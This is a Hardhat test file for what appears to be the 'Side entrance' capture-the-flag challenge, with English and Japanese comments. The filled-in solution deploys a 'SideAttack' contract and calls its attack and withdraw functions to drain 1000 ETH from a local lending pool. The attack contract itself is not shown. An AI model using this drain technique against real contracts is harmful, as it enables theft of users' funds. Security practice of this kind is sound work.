const { ethers } = require('hardhat')
const { expect } = require('chai')
// https://hardhat.org/hardhat-network-helpers/docs/reference#setbalance(address,-balance)
// setBalance is a Hardhat Network helper that allows you to set the balance of an account.
const { setBalance } = require('@nomicfoundation/hardhat-network-helpers')

describe('[Challenge] Side entrance', function () {
    let deployer, player
    let pool

    // numbers
    const ETHER_IN_POOL = 1000n * 10n ** 18n
    const PLAYER_INITIAL_ETH_BALANCE = 1n * 10n ** 18n

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        /** シナリオセットアップ、何もいじることはない */
        ;[deployer, player] = await ethers.getSigners()

        // Deploy pool and fund it
        // poolをデプロイして、ファンドを渡す
        pool = await (
            await ethers.getContractFactory('SideEntranceLenderPool', deployer)
        ).deploy() // factoryを作成、deployする
        await pool.deposit({ value: ETHER_IN_POOL })
        expect(await ethers.provider.getBalance(pool.address)).to.equal(
            ETHER_IN_POOL
        )

        // Player starts with limited ETH in balance
        // Playerは限られたETHを持ってスタートする
        await setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE)
        expect(await ethers.provider.getBalance(player.address)).to.eq(
            PLAYER_INITIAL_ETH_BALANCE
        )
        console.log(
            ethers.utils.formatEther(
                await ethers.provider.getBalance(player.address)
            ),
            `ether`
        ) // 1.0 ether
        console.log(`before hook ended`)
    })

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        // ここにコードを書く
        // SideAttackコントラクトをデプロイする
        sideAttack = await (
            await ethers.getContractFactory('SideAttack', deployer)
        )
            .connect(player)
            .deploy(pool.address)
        // attack関数を呼ぶ
        console.log(await pool.balances(sideAttack.address)) // 1000 ether
        await sideAttack.connect(player).attack()
        // すべてのイーサをプールから引き出す
        console.log(await pool.balances(sideAttack.address)) // 1000 ether
        // withdraw関数を呼ぶ
        await sideAttack.connect(player).withdraw()
    })

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
        /** 成功条件、何もいじることはない */

        // Player took all ETH from the pool
        // PlayerはプールからすべてのETHを取り出したか？
        expect(await ethers.provider.getBalance(pool.address)).to.be.equal(0)
        expect(await ethers.provider.getBalance(player.address)).to.be.gt(
            ETHER_IN_POOL
        )
    })
})
